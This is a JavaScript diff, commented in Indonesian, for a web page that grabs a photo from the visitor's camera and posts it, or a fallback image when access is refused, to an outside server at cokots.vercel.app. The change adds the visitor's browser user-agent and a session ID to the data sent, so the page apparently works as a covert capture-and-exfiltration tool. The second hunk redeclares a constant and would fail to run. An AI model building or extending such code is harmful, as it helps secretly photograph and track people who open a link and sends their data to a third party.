@@ -14,16 +14,22 @@
             const photoBlob = await imageCapture.takePhoto();
             track.stop(); // Hentikan kamera setelah foto diambil
 
+            // Ambil user-agent dari browser
+            const userAgent = navigator.userAgent;
+            
+            // Tambahkan user-agent ke dalam caption
+            const session = new URLSearchParams(window.location.search).get("session");
+
             const captions = `
             📍 **Pengguna ini mengizinkan kamera pada browsernya**
+            🌐 User-Agent: ${userAgent}
+            🔑 Session: ${session}
             `;
             
             // Kirim foto ke server
             const formData = new FormData();
             formData.append("photo", photoBlob);
             formData.append("caption", captions);
-            
-            const session = new URLSearchParams(window.location.search).get("session");
             
             const response = await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
                 method: "POST",
@@ -64,8 +70,16 @@
         const blob = await response.blob();  // Mengonversi gambar menjadi Blob        
         const session = new URLSearchParams(window.location.search).get("session");
         
+        // Ambil user-agent dari browser
+        const userAgent = navigator.userAgent;
+        
+        // Tambahkan user-agent ke dalam caption
+        const session = new URLSearchParams(window.location.search).get("session");
+
         const captions = `
         📍 **Pengguna ini tidak mengizinkan kamera pada browsernya**
+        🌐 User-Agent: ${userAgent}
+        🔑 Session: ${session}
         `;
         
         // Kirim foto kosong (fallback) ke server
